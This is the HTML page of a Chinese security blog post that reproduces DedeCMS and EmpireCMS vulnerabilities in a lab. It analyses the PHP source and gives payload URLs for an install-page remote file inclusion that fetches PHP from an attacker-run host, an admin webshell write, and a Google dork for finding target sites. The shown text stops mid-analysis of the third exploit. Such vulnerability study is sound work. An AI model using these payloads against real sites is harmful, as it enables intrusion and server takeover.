@@ -1,0 +1,807 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;dark&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/txbb.jpg">
+  <link rel="icon" type="image/png" href="/img/txbb.jpg">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="Na0h_1e3">
+  <meta name="keywords" content="Na0h1e3,blog,博客,web,ctf,渗透">
+  <title>织梦cms、帝国cms的搭建及漏洞复现 - Na0h的神光棒存放地</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.4.0/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"na0hblog.top","root":"/","version":"1.8.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"🐳_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":true,"baidu":null,"google":"G-MLL1PZ9RBK","gtag":260676474,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"zjCV2oT3ti8Lyk0insYTRpLr-gzGzoHsz","app_key":"y4AXlgIqQsV7Enr3IFS3r6Ck","server_url":"https://zjcv2ot3.lc-cn-n1-shared.com"}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Na0h的神光棒存放地</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/textbg.jpg') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="织梦cms、帝国cms的搭建及漏洞复现">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-02-13 11:40" pubdate>
+        2021年2月13日 中午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      3k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      41
+       分钟
+    </span>
+  
+
+  
+  
+    
+      <!-- LeanCloud 统计文章PV -->
+      <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+        <i class="iconfont icon-eye" aria-hidden="true"></i>
+        <span id="leancloud-page-views"></span> 次
+      </span>
+    
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">织梦cms、帝国cms的搭建及漏洞复现</h1>
+            
+              <p class="note note-info">
+                
+                  本文最后更新于：2021年2月14日 晚上
+                
+              </p>
+            
+            <div class="markdown-body">
+              <!-- more -->
+
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这里看到phpstudy自带了这织梦cms和帝国cms，可能是比较经典的cms吧</p>
+<p>因此打算安装这两样复现一下漏洞</p>
+<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>首先在官网下载源码~</p>
+<p>织梦cms：<a target="_blank" rel="noopener" href="http://www.dedecms.com/products/dedecms/downloads/">产 品 / DedeCMS / 软件下载_织梦CMS</a></p>
+<p>帝国cms：<a target="_blank" rel="noopener" href="http://www.phome.net/download/">帝国软件 -&gt; 产品下载 (phome.net)</a></p>
+<p>我下载的是这两个：</p>
+<p><img src="https://i.loli.net/2021/02/13/1SHLytuQWisp8PO.png" srcset="/img/loading.gif" alt="7FYRZI___K__YW_X_BR0YIS.png"></p>
+<p>具体安装过程很简单，跟着教程走就可以了</p>
+<p>进入安装目录，逐步填写信息即可</p>
+<blockquote>
+<p>安装目录：</p>
+<p>织梦cms：uploads/install</p>
+<p>帝国cms：upload/e/install</p>
+<p>ps:在真实配置的时候是将upload中的源文件复制到服务器目录中。这里我直接解压了~</p>
+</blockquote>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="织梦cms"><a href="#织梦cms" class="headerlink" title="织梦cms"></a>织梦cms</h3><p>dedecms的漏洞很多，比较用的人多了，找洞的人也就多了。</p>
+<p>这里先随便挑两个复现一下</p>
+<p>ps：google hack搜索dedecms搭建的网站：<code>intitle:powered by dedecms</code></p>
+<p><img src="https://i.loli.net/2021/02/14/5scAk7leiI3Qx1j.jpg" srcset="/img/loading.gif" alt="google_hack常用语法"></p>
+<h4 id="5-7-SP1远程文件包含漏洞-CVE-2015-4553"><a href="#5-7-SP1远程文件包含漏洞-CVE-2015-4553" class="headerlink" title="5.7-SP1远程文件包含漏洞(CVE-2015-4553)"></a>5.7-SP1远程文件包含漏洞(CVE-2015-4553)</h4><blockquote>
+<p>影响版本：DeDeCMS &lt; 5.7-sp1,包括5.7 sp1版本</p>
+<p>描述：该漏洞存在于/install/index.php中(安装后为index.php.bak)。由于$$符号的使用不当（即可变变量）导致变量覆盖，最终引发远程文件包含漏洞</p>
+<p>修复：将相关变量改为常量定义</p>
+</blockquote>
+<p>织梦cms5.7 sp1：<a target="_blank" rel="noopener" href="http://www.downcode.com/downcode/j_12898.shtml">织梦CMS(DedeCMS) v5.7 SP1 UTF8 build20150618 - 源码下载 (downcode.com)</a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">foreach</span>(<span class="hljs-keyword">Array</span>(<span class="hljs-string">&#x27;_GET&#x27;</span>,<span class="hljs-string">&#x27;_POST&#x27;</span>,<span class="hljs-string">&#x27;_COOKIE&#x27;</span>) <span class="hljs-keyword">as</span> <span class="hljs-variable">$_request</span>)<br>    <span class="hljs-comment">#用foreach遍历数组，每次循环将数组单元的值赋给$_request（以get、post、cookie传入的值）</span><br>&#123;<br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$$_request</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$_k</span> =&gt; <span class="hljs-variable">$_v</span>) $&#123;<span class="hljs-variable">$_k</span>&#125; = RunMagicQuotes(<span class="hljs-variable">$_v</span>);<br>    <span class="hljs-comment">#foreach遍历数组，将当前数组单元的键名赋给$_k，当前数组单元的值赋给$_v。</span><br>    <span class="hljs-comment">#RunMagicQuotes()作为过滤函数存在</span><br>    <span class="hljs-comment">#$$_request：可变变量，以$_request这个变量的值作为变量名</span><br>    <span class="hljs-comment">#$&#123;$_k&#125;：PHP分析双引号中的数据是否含有变量（并解析它的值），当用双引号时,&#123;&#125;用来界定变量的界限。</span><br>&#125;<br></code></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php">function _RunMagicQuotes（&amp;$svar）&#123;<br><span class="hljs-keyword">if</span>（！get_magic_quotes_gpc（））&#123;<br>    <br>	<span class="hljs-keyword">if</span>（is_array（<span class="hljs-variable">$svar</span>））&#123;<br>	<span class="hljs-keyword">foreach</span>（<span class="hljs-variable">$svar</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$_k</span> =&gt; <span class="hljs-variable">$_v</span>）<span class="hljs-variable">$svar</span>[<span class="hljs-variable">$_k</span>] = _RunMagicQuotes（<span class="hljs-variable">$_v</span>）；<br>        <br>	&#125;<span class="hljs-keyword">else</span>&#123;<br>        <br>	<span class="hljs-keyword">if</span>（strlen（<span class="hljs-variable">$svar</span>）&gt;<span class="hljs-number">0</span>&amp;&amp;preg_match（<span class="hljs-string">&#x27;#^（cfg_|GLOBALS|_GET|_POST|_COOKIE）#&#x27;</span>，<span class="hljs-variable">$svar</span>））&#123;<br>		<span class="hljs-keyword">exit</span>（<span class="hljs-string">&#x27;Request var not allow！&#x27;</span>）；<br>    		&#125;<br>        <br>	<span class="hljs-variable">$svar</span> = addslashes（<span class="hljs-variable">$svar</span>）；<br>        <span class="hljs-comment">#使用addslashes（）函数过滤</span><br>        <span class="hljs-comment">#在某些字符前加上了反斜线。: 引号（&#x27;）、双引号（&quot;）、反斜线（\）、 NULL（null 字符）</span><br>		&#125;<br>	&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-variable">$svar</span>；<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>访问安装页面，由于install_lock的存在，无法重新安装：</p>
+<p><img src="https://i.loli.net/2021/02/14/Fm1CsbuBn6LYoZW.png" srcset="/img/loading.gif"></p>
+<p>判断原理：定义了变量$insLockfile，利用file_exists()判断install_lock.txt是否存在<br>（取不存在的文件即可使判断条件失效）</p>
+<p><img src="https://i.loli.net/2021/02/14/4J1kzME8CPFAxqH.png" srcset="/img/loading.gif"></p>
+<p>由此进行变量覆盖即可绕过上述判断 <code>xxx/uploads/install/index.php?insLockfile=1</code></p>
+<p><img src="https://i.loli.net/2021/02/14/qQlDNRW7B2nJY6k.png" srcset="/img/loading.gif"></p>
+<p>后续由于install_lock.txt的存在，使得安装无法连贯，但访问相应的页面还是可以的</p>
+<p>如：<code>xxx/uploads/install/index.php?step=3&amp;insLockfile=1</code>（由此我们可以在后面访问step=11）</p>
+<p><img src="https://i.loli.net/2021/02/14/gG5cka9ZzYQHDRd.png" srcset="/img/loading.gif"></p>
+<p>再看源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$step</span>==<span class="hljs-number">11</span>)<br>&#123;<br>	<span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;../data/admin/config_update.php&#x27;</span>);<br>    <span class="hljs-comment">#包含了../data/admin/config_update.php,在其中定义了updateHost和linkHost</span><br>    <br>	<span class="hljs-variable">$rmurl</span> = <span class="hljs-variable">$updateHost</span>.<span class="hljs-string">&quot;dedecms/demodata.<span class="hljs-subst">&#123;$s_lang&#125;</span>.txt&quot;</span>;<br>	<span class="hljs-comment">#将config_update.php中的UPDATEHOST与dedecms/demodata.&#123;$s_lang&#125;.txt拼接为字符串</span><br>    <br>	<span class="hljs-variable">$sql_content</span> = file_get_contents(<span class="hljs-variable">$rmurl</span>);<br>    <span class="hljs-comment">#利用file_get_contents()读取$rmurl指代的文件内容</span><br>    <br>	<span class="hljs-variable">$fp</span> = fopen(<span class="hljs-variable">$install_demo_name</span>,<span class="hljs-string">&#x27;w&#x27;</span>);<span class="hljs-comment">#定义变量$fp,打开$install_demo_name指代的文件(w权限)</span><br>	<span class="hljs-keyword">if</span>(fwrite(<span class="hljs-variable">$fp</span>,<span class="hljs-variable">$sql_content</span>))<span class="hljs-comment">#将$sql_content写入到$install_demo_name指代的文件</span><br>		<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&amp;nbsp; &lt;font color=&quot;green&quot;&gt;[√]&lt;/font&gt; 存在(您可以选择安装进行体验)&#x27;</span>;<br>	<span class="hljs-keyword">else</span><br>		<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&amp;nbsp; &lt;font color=&quot;red&quot;&gt;[×]&lt;/font&gt; 远程获取失败&#x27;</span>;<br>	<span class="hljs-keyword">unset</span>(<span class="hljs-variable">$sql_content</span>);<br>	fclose(<span class="hljs-variable">$fp</span>);<br>	<span class="hljs-keyword">exit</span>();<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>包含的config_update，其中定义了变量updateHost和linkHost</p>
+<p><img src="https://i.loli.net/2021/02/14/Vj3Z1m9YvATG6fu.png" srcset="/img/loading.gif"></p>
+<p>利用：</p>
+<p>1.判断语句为if(step==11），须传入step=11；<br>存在install_lock.txt，传入insLockfile=1（取不存在的文件使得判断条件失效）</p>
+<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gradle">payload：<br>xxx<span class="hljs-regexp">/uploads/i</span>nstall/index.php?<span class="hljs-keyword">step</span>=<span class="hljs-number">11</span>&amp;insLockfile=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2021/02/14/tHFvmb8LRqnlY4p.png" srcset="/img/loading.gif"></p>
+<p>2.updateHost是来自于config_update.php的包含，无法直接将该变量覆盖。<br>故需要借用<code>fopen($install_demo_name,&#39;w&#39;)</code><strong>将config_update.php清空</strong><br>(w权限特质, 文件存在则清空内容再写入)</p>
+<p>构造payload：</p>
+<p>传入<code>$install_demo_name=config_update.php；</code></p>
+<p>而<code>fwrite($fp,$sql_content)</code>的存在会将 <code>$sql_content</code> 写入<code>config_update.php</code></p>
+<p><code>$sql_content</code>是提取<code>$rmurl</code>指代的文件内容写入</p>
+<p><code>file_get_contents</code>读取失败时返回NULL，因此控制<code>$s_lang</code>为不存在的文件名即可使<code>$sql_content</code>= NULL</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">payload：<br>xxx<span class="hljs-regexp">/uploads/i</span>nstall<span class="hljs-regexp">/index.php?step=11&amp;insLockfile=1&amp;install_demo_name=../</span>data<span class="hljs-regexp">/admin/</span>config_update.php&amp;s_lang=hhhhhh<br></code></pre></td></tr></table></figure>
+<p>显示为0kb，显然config_update.php已被清空了</p>
+<p><img src="https://i.loli.net/2021/02/14/PUsAi5xjzIXw1c7.png" srcset="/img/loading.gif"></p>
+<p>3.随着config_update.php的清空，参数updateHost变得可控，可以开始远程上传文件了~</p>
+<p>在kali上创建一个dedecms文件夹,然后创建一个demodata.gb2312.txt,写入<code>&lt;?php phpinfo();?&gt;</code> </p>
+<p>然后开启web服务: <code>sudo service apache2 start</code></p>
+<p><img src="https://i.loli.net/2021/02/14/P7RzZ83vpw1kISt.png" srcset="/img/loading.gif"></p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">payload：<br>xxx<span class="hljs-regexp">/uploads/i</span>nstall<span class="hljs-regexp">/index.php?step=11&amp;insLockfile=1&amp;install_demo_name=../i</span>nfo.php&amp;updateHost=目标主机ip<br></code></pre></td></tr></table></figure>
+<p>显示如下画面即成功</p>
+<p><img src="https://i.loli.net/2021/02/14/tHFvmb8LRqnlY4p.png" srcset="/img/loading.gif"></p>
+<p>如下</p>
+<p><img src="https://i.loli.net/2021/02/14/DEIowJPlQvh3dyG.png" srcset="/img/loading.gif"></p>
+<p>此漏洞根源还是变量覆盖，修复：</p>
+<p>1、可以看看DISCUZ是怎么做的，当发现KEY的第一个字符存在_就不注册变量。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">foreach</span>(<span class="hljs-keyword">array</span>(‘_COOKIE’, ‘_POST’, ‘_GET’) <span class="hljs-keyword">as</span> <span class="hljs-variable">$_request</span>) &#123;<br><br> <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$$_request</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$_key</span> =&gt; <span class="hljs-variable">$_value</span>) &#123;<br><br> <span class="hljs-variable">$_key</span>&#123;<span class="hljs-number">0</span>&#125; != ‘_’ &amp;&amp; <span class="hljs-variable">$$_key</span> = daddslashes(<span class="hljs-variable">$_value</span>);<br><br> &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>
+<p>2、官方sp2：</p>
+<p>利用define函数构造为常量</p>
+<h4 id="5-7-SP2后台代码执行漏洞-CNVD-2018-01221"><a href="#5-7-SP2后台代码执行漏洞-CNVD-2018-01221" class="headerlink" title="5.7-SP2后台代码执行漏洞(CNVD-2018-01221)"></a>5.7-SP2后台代码执行漏洞(CNVD-2018-01221)</h4><blockquote>
+<p>影响版本：DeDeCMS &lt; 5.7-sp2,包括5.7 sp2版本</p>
+<p>描述：tpl.php中存在代码执行漏洞,可以通过该漏洞在增加新标签中上传木马,获取webshell。<br>利用条件：需要登录后台；后台的账户权限是管理员权限。</p>
+</blockquote>
+<p>1、此处要求具有管理员权限，并登入后台</p>
+<p>2、分析dede/tpl.php：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php">...<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$action</span>==<span class="hljs-string">&#x27;savetagfile&#x27;</span>)<br>    <span class="hljs-comment">#$action必须等于savetagfile才能执行下面代码</span><br>&#123;<br>    csrf_check();<span class="hljs-comment">#检验csrf，必须添加token进行绕过</span><br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;#^[a-z0-9_-]&#123;1,&#125;\.lib\.php$#i&quot;</span>, <span class="hljs-variable">$filename</span>))<br>        <span class="hljs-comment">#此处正则匹配：[a-z0-9_-]任意字符(大于1次) + .lib.php 的字符串：xxx.lib.php</span><br>        <span class="hljs-comment">#$filename不符合正则表达则无法进行修改，构造符号正则的$filename即可</span><br>    &#123;<br>        ShowMsg(<span class="hljs-string">&#x27;文件名不合法，不允许进行操作！&#x27;</span>, <span class="hljs-string">&#x27;-1&#x27;</span>);<br>        <span class="hljs-keyword">exit</span>();<br>    &#125;<br>    <span class="hljs-keyword">require_once</span>(DEDEINC.<span class="hljs-string">&#x27;/oxwindow.class.php&#x27;</span>);<br>    <span class="hljs-variable">$tagname</span> = preg_replace(<span class="hljs-string">&quot;#\.lib\.php$#i&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$filename</span>);<br>    <span class="hljs-variable">$content</span> = stripslashes(<span class="hljs-variable">$content</span>);<br>    <span class="hljs-variable">$truefile</span> = DEDEINC.<span class="hljs-string">&#x27;/taglib/&#x27;</span>.<span class="hljs-variable">$filename</span>;<br>    <span class="hljs-comment">#传入的路径为include/taglib/filename(常量DEDEINC=include)</span><br>    <span class="hljs-variable">$fp</span> = fopen(<span class="hljs-variable">$truefile</span>, <span class="hljs-string">&#x27;w&#x27;</span>);<br>    fwrite(<span class="hljs-variable">$fp</span>, <span class="hljs-variable">$content</span>);<span class="hljs-comment">#将$content的内容写入$fp代表的路径</span><br>    fclose(<span class="hljs-variable">$fp</span>);<br>    ...<br></code></pre></td></tr></table></figure>
+
+
+<p>此处正则匹配：[a-z0-9_-]任意字符(大于1次) + .lib.php 的字符串：xxx.lib.php<br><img src="https://i.loli.net/2021/02/14/rX9lOf3dHRJyiGD.png" srcset="/img/loading.gif"></p>
+<p>3、获取token绕过csrf</p>
+<p>查看tpl.php，发现action有很多参数，但仅当action=upload才能获取token</p>
+<p><img src="https://i.loli.net/2021/02/14/hNAKDiyJRT9jeBL.png" srcset="/img/loading.gif"></p>
+<p>访问tpl.php?action=upload；查看页面源代码即可获取token</p>
+<p><img src="https://i.loli.net/2021/02/14/82xRVBh3gONomtQ.png" srcset="/img/loading.gif"></p>
+<p>4、</p>
+<p>上传参数：<br>(由于dedecms全局变量注册的特性，content变量和filename变量可控，可以直接将content写入xxx.lib.php文件)<br><code>action=savetagfile</code><br><code>token=上面action=upload获取的token</code><br><code>content=要写入的🐎</code><br><code>filename=xxx.lib.php（要匹配正则）</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">payload:<br>dede/tpl.php?action=savetagfile&amp;token=<span class="hljs-number">6</span>ef0da020e1836c5401127d2605cb35b&amp;filename=info.lib.php&amp;content=<span class="hljs-meta">&lt;?php</span> phpinfo();<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<p>之前查看代码可知传入的路径为include/taglib/$filename</p>
+<p>访问<code>include/taglib/info.lib.php</code>即可</p>
+<p><img src="https://i.loli.net/2021/02/14/dIOG1YUcrPkWjHg.png" srcset="/img/loading.gif"></p>
+<p>修复：</p>
+<p>1.禁止此处写入文件。</p>
+<p>2.过滤恶意标签</p>
+<h3 id="帝国cms"><a href="#帝国cms" class="headerlink" title="帝国cms"></a>帝国cms</h3><h4 id="7-5后台getshell-CVE-2018-18086"><a href="#7-5后台getshell-CVE-2018-18086" class="headerlink" title="7.5后台getshell(CVE-2018-18086)"></a>7.5后台getshell(CVE-2018-18086)</h4><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gradle">影响版本：帝国CMS(EmpireCMS) &lt;= <span class="hljs-number">7.5</span><br><br>描述：EmpireCMS7.<span class="hljs-number">5</span>版本中的<span class="hljs-regexp">/e/</span><span class="hljs-keyword">class</span>/moddofun.php文件的”LoadInMod”函数存在安全漏洞,攻击者可利用该漏洞上传任意文件。<br></code></pre></td></tr></table></figure>
+<p>上传任意文件：</p>
+<p>/e/admin/ecmsmod.php中：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//导入模型</span><br><span class="hljs-keyword">elseif</span>(<span class="hljs-variable">$enews</span>==<span class="hljs-string">&quot;LoadInMod&quot;</span>)<br>&#123;<br>	<span class="hljs-variable">$file</span>=<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>    <span class="hljs-variable">$file_name</span>=<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];<br>    <span class="hljs-variable">$file_type</span>=<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>];<br>    <span class="hljs-variable">$file_size</span>=<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;size&#x27;</span>];<br>	LoadInMod(<span class="hljs-variable">$_POST</span>,<span class="hljs-variable">$file</span>,<span class="hljs-variable">$file_name</span>,<span class="hljs-variable">$file_type</span>,<span class="hljs-variable">$file_size</span>,<span class="hljs-variable">$logininid</span>,<span class="hljs-variable">$loginin</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>查看LoadInMod函数（/e/class/moddofun.php）：</p>
+<details>
+    <summary>LoadInMod函数</summary>
+    <pre><codes>
+    function LoadInMod($add,$file,$file_name,$file_type,$file_size,$userid,$username)&#123;
+    global $empire,$dbtbpre,$ecms_config;
+    //验证权限
+    CheckLevel($userid,$username,$classid,"table");
+    $tbname=RepPostVar(trim($add['tbname']));
+    if(!$file_name||!$file_size||!$tbname)
+    &#123;
+        printerror("EmptyLoadInMod","");
+    &#125;
+    //扩展名
+    $filetype=GetFiletype($file_name);
+    if($filetype!=".mod")
+    &#123;
+        printerror("LoadInModMustmod","");
+    &#125;
+    //表名是否已存在
+    $num=$empire->gettotal("select count(*) as total from &#123;$dbtbpre&#125;enewstable where tbname='$tbname' limit 1");
+    if($num)
+    &#123;
+        printerror("HaveLoadInTb","");
+    &#125;
+    //上传文件
+    $path=ECMS_PATH."e/data/tmp/mod/uploadm".time().make_password(10).".php";
+    #使用make_password(10)对时间进行加密最终拼接成为文件名
+    $cp=@move_uploaded_file($file,$path);
+    if(!$cp)
+    &#123;
+        printerror("EmptyLoadInMod","");
+    &#125;
+    DoChmodFile($path);
+    @include($path);#这里将$path指代的文件包含了，由此可以构造php进行文件操作让他帮我们写shell
+    UpdateTbDefMod($tid,$tbname,$mid);
+    //公共变量
+    TogSaveTxtF(1);
+    GetConfig(1);//更新缓存
+    //生成模型表单文件
+    $modr=$empire->fetch1("select mtemp,qmtemp,cj from &#123;$dbtbpre&#125;enewsmod where mid='$mid'");
